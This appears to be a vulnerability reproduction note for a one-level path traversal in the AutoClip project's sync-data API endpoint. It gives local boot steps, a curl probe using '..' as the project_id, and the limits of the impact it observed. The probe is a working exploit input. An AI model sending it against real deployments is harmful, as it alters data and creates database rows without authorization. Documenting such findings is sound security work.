# AutoClip project_id one-level path traversal — reproduction
repo: ayushdad609-code/autoclip  (pinned commit in pinned_commit.txt)
corpus path: calibration/mined_prompts_v2/ayushdad609-code__autoclip/_repo_src
boot (isolated): AUTOCLIP_DATA_DIR + DATABASE_URL=sqlite temp, PYTHONPATH=_repo_src,
  python3 -m uvicorn backend.main:app --host 127.0.0.1 --port 8131
probe: curl --path-as-is -X POST http://127.0.0.1:8131/api/v1/projects/../sync-data
result: 200 OK, project_id="..", sync operated on data/projects/../ (parent data dir),
  DB row created in projects (id=".."). Ceiling: single .. only; deep/%2f/absolute 404.
bound: one-level escape into parent data dir + DB row. NOT arbitrary FS / sensitive / RCE.
